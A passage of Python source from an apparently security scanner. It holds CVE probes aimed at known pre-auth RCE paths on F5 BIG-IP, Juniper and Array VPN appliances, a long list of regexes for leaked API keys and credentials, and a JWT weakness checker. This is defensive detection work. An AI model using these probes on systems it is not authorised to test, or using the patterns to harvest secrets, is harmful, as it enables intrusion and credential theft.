             "Check Point Quantum Gateways R80.20-R81.20 with IPsec VPN or Mobile Access enabled",
             "Apply Hotfix; upgrade to R81.20 Jumbo Hotfix Accumulator Take 54+"),

            # ── F5 BIG-IP APM ──
            ("CVE-2023-46747", "f5_apm",
             "/mgmt/tm/util/bash",
             "status", None, 401, 9.8,
             "Auth bypass via request smuggling — unauthenticated admin access to management API",
             "BIG-IP 13.x-17.x before fixes",
             "Upgrade BIG-IP: 17.1.1+, 16.1.4.1+, 15.1.10.2+; restrict management to trusted IPs"),
            ("CVE-2022-1388", "f5_apm",
             "/mgmt/tm/util/bash",
             "body_match", re.compile(r'commandResult|apiResponse|Unauthorized', re.I), None, 9.8,
             "iControl REST auth bypass — pre-auth RCE as root",
             "BIG-IP 13.1.x-16.1.x before 16.1.2.2, 15.1.5.1, 14.1.4.6",
             "Upgrade immediately; restrict management interface access"),

            # ── Juniper SRX / Secure Connect ──
            ("CVE-2023-36845", "juniper_vpn",
             "/webauth_operation.php?PHPRC=/dev/stdin",
             "body_match", re.compile(r'php|junos|juniper|error', re.I), None, 9.8,
             "PHP environment variable injection — pre-auth RCE on Juniper SRX/EX",
             "Junos OS on SRX/EX: multiple versions before fixes",
             "Upgrade Junos OS; disable J-Web if not needed"),

            # ── Array Networks ──
            ("CVE-2023-28461", "array_vpn",
             "/prx/000/http/localhost/login",
             "body_match", re.compile(r'array|arrayos|AG\s*Series', re.I), None, 9.8,
             "RCE via missing authentication — unauthenticated remote code execution (CISA KEV)",
             "Array AG/vxAG Series ArrayOS before 9.4.0.484",
             "Upgrade ArrayOS to 9.4.0.484+; apply vendor hotfix"),
        ]

        # Only probe CVEs for vendors we've detected
        detected_pids = set(detected.keys())
        relevant_cves = [(c, pid, *rest) for c, pid, *rest in _CVE_PROBES
                         if pid in detected_pids]

        if relevant_cves:
            with concurrent.futures.ThreadPoolExecutor(max_workers=6) as cve_pool:
                cve_futures = {}
                for entry in relevant_cves:
                    (cve_id, _pid, path, method, body_pat,
                     vuln_cond, cvss, desc, affected, remed) = entry
                    f = cve_pool.submit(
                        _probe_cve, cve_id, path, method, body_pat,
                        vuln_cond, cvss, desc, affected, remed)
                    cve_futures[f] = (cve_id, _pid)

                for f in concurrent.futures.as_completed(cve_futures, timeout=timeout * 4):
                    try:
                        r = f.result()
                        if r:
                            # Tag with the product_id for later mapping
                            r["product_id"] = cve_futures[f][1]
                            cve_findings.append(r)
                    except Exception:
                        pass

    # Attach CVE findings to detected products using product_id tag
    for vpn in detected.values():
        vpn["cve_checks"] = []
        vpn["verified_cves"] = []
        vpn["potential_cves"] = []
    for c in cve_findings:
        cpid = c.get("product_id", "")
        if cpid in detected:
            detected[cpid]["cve_checks"].append(c)
            if c.get("verified"):
                detected[cpid]["verified_cves"].append(c["cve_id"])
            elif c.get("evidence"):
                detected[cpid]["potential_cves"].append(c["cve_id"])

    vpn_list = sorted(detected.values(), key=lambda x: x["label"])

    # Aggregate CVE stats
    all_verified = []
    all_potential = []
    max_cvss = 0.0
    for v in vpn_list:
        all_verified.extend(v.get("verified_cves", []))
        all_potential.extend(v.get("potential_cves", []))
        for c in v.get("cve_checks", []):
            if c.get("verified") and c.get("cvss", 0) > max_cvss:
                max_cvss = c["cvss"]

    return {
        "vpn_endpoints": vpn_list,
        "total_found": len(vpn_list),
        "paths_probed": len(probed_paths),
        "products": [v["label"] for v in vpn_list],
        "cve_findings": cve_findings,
        "verified_cves": all_verified,
        "potential_cves": all_potential,
        "max_cvss": max_cvss,
        "has_critical_cves": any(
            (v.get("severity_note") or "").startswith("Critical")
            for v in vpn_list) or max_cvss >= 9.0,
        "severity": ("critical" if (max_cvss >= 9.0 or any(
            (v.get("severity_note") or "").startswith("Critical") for v in vpn_list))
                     else "high" if vpn_list else "info"),
        "summary": (
            (f"{len(vpn_list)} VPN endpoint(s): {', '.join(v['label'] for v in vpn_list)}"
             + (f" | {len(all_verified)} verified CVE(s): {', '.join(all_verified[:3])}"
                if all_verified else "")
             + (f" | {len(all_potential)} potential CVE(s)" if all_potential else ""))
            if vpn_list else "No VPN endpoints detected"),
    }


# ---------------------------------------------------------------------------
# Secret / Credential Detection (#16, #17, #18, #19)
# ---------------------------------------------------------------------------

_API_KEY_PATTERNS = [
    # Cloud providers
    (re.compile(r'AKIA[0-9A-Z]{16}'), "aws_access_key", "critical"),
    (re.compile(r'(?:aws_secret|AWS_SECRET)["\s:=]+[A-Za-z0-9/+=]{40}'), "aws_secret_key", "critical"),
    (re.compile(r'AIza[0-9A-Za-z\-_]{35}'), "google_api_key", "high"),
    (re.compile(r'ya29\.[0-9A-Za-z\-_]+'), "google_oauth_token", "critical"),
    # GitHub
    (re.compile(r'gh[pousr]_[A-Za-z0-9_]{36,255}'), "github_token", "critical"),
    (re.compile(r'github_pat_[A-Za-z0-9_]{22,255}'), "github_pat", "critical"),
    # Stripe
    (re.compile(r'sk_live_[0-9a-zA-Z]{24,}'), "stripe_secret_key", "critical"),
    (re.compile(r'pk_live_[0-9a-zA-Z]{24,}'), "stripe_publishable_key", "medium"),
    (re.compile(r'rk_live_[0-9a-zA-Z]{24,}'), "stripe_restricted_key", "high"),
    # Twilio
    (re.compile(r'SK[0-9a-fA-F]{32}'), "twilio_api_key", "high"),
    # Slack
    (re.compile(r'xox[bpors]-[0-9]{10,13}-[0-9a-zA-Z-]{24,}'), "slack_token", "critical"),
    (re.compile(r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+'), "slack_webhook", "high"),
    # SendGrid / Mailgun
    (re.compile(r'SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}'), "sendgrid_api_key", "high"),
    (re.compile(r'key-[0-9a-zA-Z]{32}'), "mailgun_api_key", "high"),
    # Firebase
    (re.compile(r'(?:firebase|FIREBASE)["\s:=]*[A-Za-z0-9_-]{20,}'), "firebase_key", "medium"),
    # Generic patterns
    (re.compile(r'(?:api[_-]?key|apikey|api_secret|auth_token|access_token|secret_key|private_key)["\s:=]+["\']([a-zA-Z0-9_\-]{20,})["\']', re.I), "generic_api_key", "medium"),
    (re.compile(r'(?:password|passwd|pwd)["\s:=]+["\']([^\s"\']{8,})["\']', re.I), "hardcoded_password", "high"),
     # OpenAI — multiple key formats (old T3BlbkFJ, new sk-proj-, org keys, service accounts)
     (re.compile(r'sk-[a-zA-Z0-9]{20,}T3BlbkFJ[a-zA-Z0-9]{20,}'), "openai_api_key", "critical"),
     (re.compile(r'sk-proj-[A-Za-z0-9_-]{40,}'), "openai_api_key_v2", "critical"),
     (re.compile(r'sk-svcacct-[A-Za-z0-9_-]{40,}'), "openai_service_key", "critical"),
     (re.compile(r'sk-[a-zA-Z0-9_-]{40,}'), "openai_api_key_generic", "critical"),
     # Anthropic / Claude
     (re.compile(r'sk-ant-api03-[A-Za-z0-9_-]{80,}'), "anthropic_api_key", "critical"),
     (re.compile(r'sk-ant-[a-zA-Z0-9_-]{40,}'), "anthropic_api_key_v1", "critical"),
    # Azure OpenAI / Cognitive Services
    (re.compile(r'(?:api[_-]?key|AZURE[_-]?KEY|Ocp-Apim-Subscription-Key)["\s:=]+["\']([a-f0-9]{32})["\']', re.I), "azure_cognitive_key", "critical"),
    # Hugging Face
    (re.compile(r'hf_[A-Za-z0-9]{34,}'), "huggingface_token", "critical"),
    # Cohere
    (re.compile(r'(?:cohere["\s:=]+|COHERE_API_KEY["\s:=]+)["\']([A-Za-z0-9]{40,})["\']', re.I), "cohere_api_key", "critical"),
    # Replicate
    (re.compile(r'r8_[A-Za-z0-9]{37}'), "replicate_api_token", "critical"),
    # Pinecone
    (re.compile(r'pinecone-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'), "pinecone_api_key", "critical"),
    # Weaviate
    (re.compile(r'sk-[a-zA-Z0-9]{32}-[a-zA-Z0-9]{8}'), "weaviate_api_key", "critical"),
    # Mistral AI
    (re.compile(r'(?:mistral["\s:=]+)["\']([A-Za-z0-9]{32,})["\']', re.I), "mistral_api_key", "high"),
    # Stability AI
    (re.compile(r'sk-[A-Za-z0-9]{32,}(?:-[A-Za-z0-9]+)+'), "stability_api_key", "high"),
    # Together AI
    (re.compile(r'(?:TOGETHER_API_KEY|together["\s:=]+)["\']([a-f0-9]{64})["\']', re.I), "together_api_key", "critical"),
    # Groq
    (re.compile(r'gsk_[A-Za-z0-9]{52}'), "groq_api_key", "critical"),
    # Voyage AI (embeddings)
    (re.compile(r'pa-[A-Za-z0-9_-]{40,}'), "voyage_api_key", "high"),
    # AWS — additional formats
    (re.compile(r'(?:aws_session_token|AWS_SESSION_TOKEN)["\s:=]+["\']([A-Za-z0-9/+=]{100,})["\']', re.I), "aws_session_token", "critical"),
    # GCP Service Account JSON
    (re.compile(r'"private_key_id"\s*:\s*"[a-f0-9]{40}"'), "gcp_service_account", "critical"),
    (re.compile(r'"client_email"\s*:\s*"[^"]+@[^"]+\.iam\.gserviceaccount\.com"'), "gcp_service_account_email", "high"),
    # Azure Storage Account Key
    (re.compile(r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{88}'), "azure_storage_key", "critical"),
    # Databricks
    (re.compile(r'dapi[a-f0-9]{32}'), "databricks_token", "critical"),
    # Confluent / Kafka
    (re.compile(r'(?:CONFLUENT_API_KEY|confluent["\s:=]+)["\']([A-Za-z0-9]{16})["\']', re.I), "confluent_api_key", "high"),
    # Okta
    (re.compile(r'00[A-Za-z0-9_-]{39}'), "okta_api_token", "critical"),
    # npm auth token
     (re.compile(r'npm_[A-Za-z0-9]{36}'), "npm_token", "high"),
     # ── SSL/TLS/Certificate credentials ───────────────────────────────────
     # SSL private key (all variants including EC, RSA, PKCS8)
     (re.compile(r'-----BEGIN (?:RSA |EC |DSA |ENCRYPTED )?PRIVATE KEY-----'), "ssl_private_key", "critical"),
     (re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----'), "ssh_private_key", "critical"),
     # PGP private key
     (re.compile(r'-----BEGIN PGP PRIVATE KEY BLOCK-----'), "pgp_private_key", "critical"),
     # Certificate with embedded private key (combined PEM)
     (re.compile(r'-----BEGIN CERTIFICATE-----[\s\S]{100,}-----BEGIN (?:RSA )?PRIVATE KEY-----'), "cert_with_private_key", "critical"),
     # PKCS#12 / .pfx in base64 (starts with MII and is long)
     (re.compile(r'MII[A-Za-z0-9+/]{200,}={0,2}'), "pkcs12_cert", "high"),
     # ── Database / connection string credentials ──────────────────────────
     (re.compile(r'(?:mongodb|mongo)\+?srv?://[^:\s"\']{2,}:[^@\s"\']{8,}@', re.I), "mongodb_connection_string", "critical"),
     (re.compile(r'postgresql://[^:\s"\']{2,}:[^@\s"\']{8,}@', re.I), "postgresql_connection_string", "critical"),
     (re.compile(r'mysql://[^:\s"\']{2,}:[^@\s"\']{8,}@', re.I), "mysql_connection_string", "critical"),
     (re.compile(r'redis://:[^@\s"\']{8,}@', re.I), "redis_connection_string", "high"),
     (re.compile(r'amqp://[^:\s"\']{2,}:[^@\s"\']{8,}@', re.I), "rabbitmq_connection_string", "high"),
     (re.compile(r'smtp://[^:\s"\']{2,}:[^@\s"\']{8,}@', re.I), "smtp_credentials", "high"),
     # ── .env file patterns ────────────────────────────────────────────────
     (re.compile(r'DATABASE_URL\s*=\s*(?:postgres|mysql|mongo)[^\s"\']{20,}', re.I), "env_database_url", "critical"),
     (re.compile(r'REDIS_URL\s*=\s*redis://[^\s"\']{10,}', re.I), "env_redis_url", "high"),
     (re.compile(r'SECRET_KEY\s*=\s*["\']([A-Za-z0-9!@#$%^&*_\-]{20,})["\']', re.I), "env_secret_key", "high"),
     (re.compile(r'APP_KEY\s*=\s*base64:[A-Za-z0-9+/=]{32,}', re.I), "laravel_app_key", "high"),
     # ── Kubernetes / Docker / Container secrets ───────────────────────────
     (re.compile(r'"auths"\s*:\s*\{[^}]*"auth"\s*:\s*"[A-Za-z0-9+/=]{20,}"'), "docker_config_auth", "critical"),
     (re.compile(r'(?:kubeconfig|KUBECONFIG)["\s:=]+["\']([^"\']{10,})["\']', re.I), "kubeconfig_path", "high"),
     # K8s service account token (JWT starting with eyJ in k8s context)
     (re.compile(r'(?:k8s|kubernetes|service[_-]?account)[^\n]*eyJ[A-Za-z0-9_-]{20,}\.eyJ', re.I), "k8s_service_account_token", "critical"),
     # ── HashiCorp Vault ───────────────────────────────────────────────────
     (re.compile(r'(?:vault[_-]?token|VAULT_TOKEN)["\s:=]+["\']([A-Za-z0-9._-]{20,})["\']', re.I), "vault_token", "critical"),
     (re.compile(r's\.[A-Za-z0-9]{24}'), "vault_token_short", "critical"),  # Vault tokens start with "s."
     # ── Terraform ─────────────────────────────────────────────────────────
     (re.compile(r'"sensitive_attributes"\s*:\s*\[.*?"password"', re.DOTALL), "terraform_state_password", "critical"),
     (re.compile(r'(?:TF_TOKEN|TF_CLOUD_TOKEN|TERRAFORM_TOKEN)["\s:=]+["\']([A-Za-z0-9._-]{20,})["\']', re.I), "terraform_cloud_token", "high"),
     # ── Observability / Monitoring vendors ────────────────────────────────
     # Datadog
     (re.compile(r'(?:DD_API_KEY|datadog[_-]?api[_-]?key)["\s:=]+["\']([a-f0-9]{32})["\']', re.I), "datadog_api_key", "high"),
     (re.compile(r'(?:DD_APP_KEY|datadog[_-]?app[_-]?key)["\s:=]+["\']([a-f0-9]{40})["\']', re.I), "datadog_app_key", "high"),
     # New Relic
     (re.compile(r'(?:NEW_RELIC_LICENSE_KEY|nr[_-]?license)["\s:=]+["\']([A-Za-z0-9]{40})["\']', re.I), "newrelic_license_key", "high"),
     (re.compile(r'NRAK-[A-Z0-9]{27}'), "newrelic_user_api_key", "high"),
     # Splunk HEC token
     (re.compile(r'(?:splunk[_-]?token|HEC_TOKEN)["\s:=]+["\']([A-Za-z0-9_-]{32,})["\']', re.I), "splunk_hec_token", "high"),
     # Sentry DSN (contains secret)
     (re.compile(r'https://[a-f0-9]{32}@(?:o\d+\.ingest\.sentry\.io|sentry\.io)/\d+'), "sentry_dsn", "medium"),
     # PagerDuty
     (re.compile(r'(?:pagerduty[_-]?key|PD_API_KEY)["\s:=]+["\']([A-Za-z0-9+/]{20,})["\']', re.I), "pagerduty_api_key", "high"),
     # ── Cloud/DevOps platform tokens ──────────────────────────────────────
     # Cloudflare API token (vs Global API key)
     (re.compile(r'(?:CF_API_TOKEN|cloudflare[_-]?api[_-]?token)["\s:=]+["\']([A-Za-z0-9_-]{40,})["\']', re.I), "cloudflare_api_token", "critical"),
     # DigitalOcean personal access token
     (re.compile(r'(?:DO_TOKEN|digitalocean[_-]?token|DIGITALOCEAN_ACCESS_TOKEN)["\s:=]+["\']([A-Za-z0-9]{64})["\']', re.I), "digitalocean_token", "critical"),
     # Vercel
     (re.compile(r'(?:VERCEL_TOKEN|vercel[_-]?token)["\s:=]+["\']([A-Za-z0-9]{24,})["\']', re.I), "vercel_token", "high"),
     # Netlify
     (re.compile(r'(?:NETLIFY_AUTH_TOKEN|netlify[_-]?token)["\s:=]+["\']([A-Za-z0-9_-]{40,})["\']', re.I), "netlify_token", "high"),
     # Railway
     (re.compile(r'(?:RAILWAY_TOKEN|railway[_-]?token)["\s:=]+["\']([A-Za-z0-9_-]{20,})["\']', re.I), "railway_token", "high"),
     # ── Analytics / Marketing ─────────────────────────────────────────────
     # Segment write key
     (re.compile(r'(?:SEGMENT_WRITE_KEY|segment[_-]?write[_-]?key)["\s:=]+["\']([A-Za-z0-9]{20,})["\']', re.I), "segment_write_key", "medium"),
     # Amplitude API key
     (re.compile(r'(?:AMPLITUDE_API_KEY|amplitude[_-]?api[_-]?key)["\s:=]+["\']([a-f0-9]{32})["\']', re.I), "amplitude_api_key", "medium"),
     # Mixpanel token
     (re.compile(r'(?:MIXPANEL_TOKEN|mixpanel[_-]?token)["\s:=]+["\']([a-f0-9]{32})["\']', re.I), "mixpanel_token", "medium"),
     # LaunchDarkly
     (re.compile(r'sdk-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'), "launchdarkly_sdk_key", "high"),
     # ── Additional private key variants ───────────────────────────────────
     # PKCS#1 RSA private key (explicit)
     (re.compile(r'-----BEGIN RSA PRIVATE KEY-----'), "rsa_private_key", "critical"),
     # EC private key
     (re.compile(r'-----BEGIN EC PRIVATE KEY-----'), "ec_private_key", "critical"),
     # Certificate request with key
     (re.compile(r'-----BEGIN CERTIFICATE REQUEST-----[\s\S]{50,}-----END CERTIFICATE REQUEST-----'), "csr_file", "medium"),
     # AWS CloudFormation / CDK with embedded secrets
     (re.compile(r'"(?:MasterUserPassword|DBPassword|AdminPassword)"\s*:\s*"([^"]{8,})"'), "cloudformation_password", "critical"),
     # Embedded credentials in URLs
     (re.compile(r'https?://[a-zA-Z0-9_-]{3,}:[a-zA-Z0-9_\-!@#$%^&*]{8,}@', re.I), "credentials_in_url", "critical"),
     # JWT secret in config
     (re.compile(r'(?:jwt[_-]?secret|JWT_SECRET)["\s:=]+["\']([A-Za-z0-9_\-!@#$%^&*]{16,})["\']', re.I), "jwt_secret", "high"),
     # Bearer token in Authorization header (echoed in response)
     (re.compile(r'(?:Authorization|X-Auth-Token)\s*:\s*Bearer\s+([A-Za-z0-9_\-\.]{30,})', re.I), "bearer_token_echo", "critical"),
     # Webhook URLs with tokens
     (re.compile(r'https://hooks\.zapier\.com/hooks/catch/[0-9]+/[A-Za-z0-9]+'), "zapier_webhook", "high"),
     (re.compile(r'https://discordapp\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+'), "discord_webhook", "high"),
     (re.compile(r'https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+'), "discord_webhook_v2", "high"),
    # Private keys
    (re.compile(r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----'), "private_key", "critical"),
    (re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----'), "ssh_private_key", "critical"),
    (re.compile(r'-----BEGIN CERTIFICATE-----'), "ssl_certificate", "medium"),
    # Hugging Face
    (re.compile(r'hf_[A-Za-z0-9]{34,}'), "huggingface_token", "critical"),
    # Replicate (tokens are r8_ + 36 chars)
    (re.compile(r'r8_[A-Za-z0-9]{36,}'), "replicate_api_key", "critical"),
    # Azure
    (re.compile(r'(?:AccountKey|SharedAccessKey)=[A-Za-z0-9+/=]{44,}'), "azure_storage_key", "critical"),
    (re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}.*(?:client_secret|clientSecret)', re.I), "azure_client_secret", "critical"),
    # Databricks (dapi + 28-40 alphanum)
    (re.compile(r'dapi[a-zA-Z0-9]{28,40}'), "databricks_token", "critical"),
    # Cloudflare
    (re.compile(r'(?:cf_|cloudflare)[_-]?(?:api[_-]?token|key)["\s:=]+[A-Za-z0-9_-]{37,}', re.I), "cloudflare_api_token", "critical"),
    # HashiCorp Vault
    (re.compile(r'hvs\.[A-Za-z0-9_-]{24,}'), "vault_service_token", "critical"),
    # npm / NPM tokens (npm_ + 30-40 chars)
    (re.compile(r'npm_[A-Za-z0-9]{30,}'), "npm_access_token", "critical"),
    # PyPI
    (re.compile(r'pypi-[A-Za-z0-9_-]{40,}'), "pypi_api_token", "critical"),
    # Telegram bot
    (re.compile(r'[0-9]{8,10}:[A-Za-z0-9_-]{35}'), "telegram_bot_token", "high"),
    # Discord bot token
    (re.compile(r'(?:Bot )[A-Za-z0-9_.-]{24}\.[A-Za-z0-9_.-]{6}\.[A-Za-z0-9_.-]{27,}'), "discord_bot_token", "critical"),
    # Microsoft Teams incoming webhook
    (re.compile(r'https://[a-z0-9-]+\.webhook\.office\.com/webhookb2/[a-zA-Z0-9@._/-]{30,}'), "ms_teams_webhook", "high"),
    # Google Chat webhook
    (re.compile(r'https://chat\.googleapis\.com/v1/spaces/[A-Za-z0-9_-]+/messages\?key=[A-Za-z0-9_-]+'), "google_chat_webhook", "high"),
    # Slack workflow/trigger webhooks
    (re.compile(r'https://hooks\.slack\.com/workflows/[A-Za-z0-9_/%-]+'), "slack_workflow_webhook", "high"),
    (re.compile(r'https://hooks\.slack\.com/triggers/[A-Za-z0-9_/%-]+'), "slack_trigger_webhook", "high"),
    # IFTTT webhook
    (re.compile(r'https://maker\.ifttt\.com/trigger/[^/]+/with/key/[A-Za-z0-9_-]+'), "ifttt_webhook", "high"),
    # PagerDuty Events API key
    (re.compile(r'https://events\.pagerduty\.com/v2/enqueue.*service_key["\s:=]+["\']([A-Za-z0-9+/=]{20,})["\']', re.I), "pagerduty_integration_key", "high"),
    # OpsGenie API key
    (re.compile(r'(?:opsgenie|opsgenieapikey)["\s:=]+["\']([a-zA-Z0-9-]{36})["\']', re.I), "opsgenie_api_key", "high"),
    # Generic webhook URL with embedded token
    (re.compile(r'https?://[a-zA-Z0-9._-]+/(?:webhook|hook|notify|callback)/[A-Za-z0-9_-]{16,}'), "generic_webhook_with_token", "medium"),
    # Shopify (shpat_ + 28-40 alphanum)
    (re.compile(r'shpat_[a-zA-Z0-9]{28,}'), "shopify_admin_token", "critical"),
    (re.compile(r'shpss_[a-zA-Z0-9]{28,}'), "shopify_shared_secret", "critical"),
    # Plaid
    (re.compile(r'(?:access|public|secret)-(?:sandbox|development|production)-[a-z0-9-]{20,}'), "plaid_key", "critical"),
    # Okta
    (re.compile(r'00[A-Za-z0-9_-]{39,}'), "okta_api_token", "high"),
    # Generic JWT secret leaked as config value
    (re.compile(r'(?:jwt[_-]?secret|JWT_SECRET)["\s:=]+["\']([A-Za-z0-9_\-!@#$%^&*]{16,})["\']', re.I), "jwt_secret", "critical"),
    # Database connection strings (postgres and postgresql both)
    (re.compile(r'(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis|mssql|mariadb):\/\/[^:@\s]+:[^@\s]+@[^\s"\']+', re.I), "db_connection_string", "critical"),
    # Private IP in JS / config (SSRF pivot indicator)
    (re.compile(r'(?:https?://|["\'])(?:10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)(?::\d+)?[/"\']'), "internal_ip_address", "high"),
]

# Mapping from secret type → vendor display name for tech stack
_SECRET_VENDOR_NAMES = {
    "openai_api_key": "OpenAI", "openai_api_key_v2": "OpenAI", "openai_service_key": "OpenAI",
    "anthropic_api_key": "Anthropic (Claude)", "anthropic_api_key_v1": "Anthropic (Claude)",
    "azure_cognitive_key": "Azure OpenAI", "huggingface_token": "Hugging Face",
    "cohere_api_key": "Cohere", "replicate_api_token": "Replicate",
    "pinecone_api_key": "Pinecone", "weaviate_api_key": "Weaviate",
    "groq_api_key": "Groq", "together_api_key": "Together AI",
    "mistral_api_key": "Mistral AI", "stability_api_key": "Stability AI",
    "voyage_api_key": "Voyage AI", "databricks_token": "Databricks",
    "aws_access_key": "AWS", "aws_secret_key": "AWS", "aws_session_token": "AWS",
    "google_api_key": "Google Cloud", "google_oauth_token": "Google Cloud",
    "gcp_service_account": "Google Cloud", "azure_storage_key": "Azure Storage",
    "github_token": "GitHub", "github_pat": "GitHub",
    "stripe_secret_key": "Stripe", "stripe_publishable_key": "Stripe",
    "slack_token": "Slack", "slack_webhook": "Slack",
    "sendgrid_api_key": "SendGrid", "mailgun_api_key": "Mailgun",
    "twilio_api_key": "Twilio", "firebase_key": "Firebase",
    "okta_api_token": "Okta", "npm_token": "npm",
    "confluent_api_key": "Confluent/Kafka", "jwt_secret": "JWT",
    # Original key names (kept for backward compat)
    "private_key": "Private Key", "ssh_private_key": "SSH Key",
    "credentials_in_url": "Credentials in URL",
    # New SSL/cert types
    "ssl_private_key": "SSL Private Key", "rsa_private_key": "RSA Private Key",
    "ec_private_key": "EC Private Key", "pgp_private_key": "PGP Private Key",
    "cert_with_private_key": "Certificate + Private Key", "pkcs12_cert": "PKCS#12 Certificate",
    "csr_file": "Certificate Signing Request",
    # DB / connection strings
    "mongodb_connection_string": "MongoDB", "postgresql_connection_string": "PostgreSQL",
    "mysql_connection_string": "MySQL", "redis_connection_string": "Redis",
    "rabbitmq_connection_string": "RabbitMQ", "smtp_credentials": "SMTP/Email",
    # .env patterns
    "env_database_url": "Database URL", "env_redis_url": "Redis URL",
    "env_secret_key": "Secret Key", "laravel_app_key": "Laravel",
    # Kubernetes / Docker
    "docker_config_auth": "Docker Registry Auth", "kubeconfig_path": "Kubernetes",
    "k8s_service_account_token": "Kubernetes Service Account",
    # HashiCorp / Terraform
    "vault_token": "HashiCorp Vault", "vault_token_short": "HashiCorp Vault",
    "terraform_state_password": "Terraform State", "terraform_cloud_token": "Terraform Cloud",
    # Observability
    "datadog_api_key": "Datadog", "datadog_app_key": "Datadog",
    "newrelic_license_key": "New Relic", "newrelic_user_api_key": "New Relic",
    "splunk_hec_token": "Splunk", "sentry_dsn": "Sentry",
    "pagerduty_api_key": "PagerDuty",
    # Cloud/DevOps
    "cloudflare_api_token": "Cloudflare", "digitalocean_token": "DigitalOcean",
    "vercel_token": "Vercel", "netlify_token": "Netlify", "railway_token": "Railway",
    # Analytics
    "segment_write_key": "Segment", "amplitude_api_key": "Amplitude",
    "mixpanel_token": "Mixpanel", "launchdarkly_sdk_key": "LaunchDarkly",
    # Misc
    "cloudformation_password": "AWS CloudFormation",
    "bearer_token_echo": "Bearer Token (Echoed)",
    "zapier_webhook": "Zapier", "discord_webhook": "Discord", "discord_webhook_v2": "Discord",
}


def check_secrets_in_response(body: str, url: str = "") -> Dict[str, Any]:
    """Scan response body for exposed API keys, tokens, and credentials (#16).

    Returns list of findings with type, severity, and masked value.
    """
    findings: List[Dict[str, Any]] = []
    seen: set = set()

    for pat, secret_type, severity in _API_KEY_PATTERNS:
        m = pat.search(body)
        if m and secret_type not in seen:
            seen.add(secret_type)
            value = m.group(0)
            # Mask the value — show first 8 and last 4 chars
            if len(value) > 16:
                masked = value[:8] + "…" + value[-4:]
            else:
                masked = value[:4] + "…"
            vendor = _SECRET_VENDOR_NAMES.get(secret_type, secret_type.replace("_", " ").title())
            findings.append({
                "type": secret_type,
                "severity": severity,
                "masked_value": masked,
                "url": url,
                "vendor": vendor,
                "description": (
                    f"{vendor} API key exposed in page/JS source. "
                    f"Rotate immediately at {vendor.lower().replace(' ', '')}.com/settings/api-keys"
                ),
            })

    # Extract vendor names for tech stack display
    vendors = list({_SECRET_VENDOR_NAMES.get(f["type"], "") for f in findings if f.get("type") in _SECRET_VENDOR_NAMES})

    return {
        "findings": findings,
        "total": len(findings),
        "has_critical": any(f["severity"] == "critical" for f in findings),
        "vendors": [v for v in vendors if v],  # For tech stack display
    }


def check_jwt_tokens(body: str, headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """Analyze JWT tokens found in response body or headers (#17).

    Checks for: weak/none algorithm, expired tokens, missing claims.
    """
    import base64 as _b64

    results: List[Dict[str, Any]] = []
    jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')

    # Search body and auth headers
    search_text = body or ""
    if headers:
        for h in ("authorization", "x-auth-token", "x-access-token", "set-cookie"):
            if headers.get(h):
                search_text += " " + headers[h]

    for m in jwt_pattern.finditer(search_text):
        token = m.group(0)
        parts = token.split(".")
        if len(parts) < 2:
            continue

        entry: Dict[str, Any] = {"token_preview": token[:40] + "…", "issues": []}

        # Decode header
        try:
            hdr_pad = parts[0] + "=" * (4 - len(parts[0]) % 4)
            hdr_json = json.loads(_b64.urlsafe_b64decode(hdr_pad))
            alg = hdr_json.get("alg", "")
            entry["algorithm"] = alg
            if alg.lower() == "none":
                entry["issues"].append({"issue": "none_algorithm", "severity": "critical",
                                        "description": "JWT uses 'none' algorithm — signature not verified"})
            elif alg.lower() in ("hs256", "hs384", "hs512"):
                entry["issues"].append({"issue": "symmetric_algorithm", "severity": "medium",
                                        "description": f"JWT uses symmetric algorithm ({alg}) — vulnerable to brute-force if secret is weak"})
        except Exception:
            pass

        # Decode payload
        try:
            payload_pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(_b64.urlsafe_b64decode(payload_pad))
            entry["claims"] = list(payload.keys())[:10]

            # Check expiration
            exp = payload.get("exp")
            if exp:
                import time as _time
                if exp < _time.time():
                    entry["issues"].append({"issue": "expired", "severity": "medium",
                                            "description": "JWT token is expired"})
            elif "exp" not in payload:
                entry["issues"].append({"issue": "no_expiry", "severity": "medium",
                                        "description": "JWT has no expiration claim (exp)"})

            # Check for sensitive data in payload
            sensitive_keys = {"password", "secret", "ssn", "credit_card", "api_key"}
            exposed = [k for k in payload.keys() if k.lower() in sensitive_keys]
            if exposed:
                entry["issues"].append({"issue": "sensitive_data", "severity": "high",
                                        "description": f"JWT payload contains sensitive claims: {', '.join(exposed)}"})
        except Exception:
            pass

        # Empty signature (none alg exploitation)
        if len(parts) >= 3 and not parts[2]:
            entry["issues"].append({"issue": "empty_signature", "severity": "critical",
                                    "description": "JWT has empty signature — may be exploitable"})

        if entry.get("issues"):
            results.append(entry)

    return {
        "tokens_found": len(jwt_pattern.findall(search_text)),
        "vulnerable_tokens": results,
        "total_issues": sum(len(t["issues"]) for t in results),
    }


def check_source_maps(host: str, port: int, use_ssl: bool,
                      timeout: int = 5,
                      extra_headers: Optional[Dict[str, str]] = None,
                      body: str = "",
                      ) -> Dict[str, Any]:
    """Detect exposed JavaScript source maps (#19).

    Checks for .map file references in HTML and probes common paths.
    """
    from fray.recon.http import _fetch_url

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

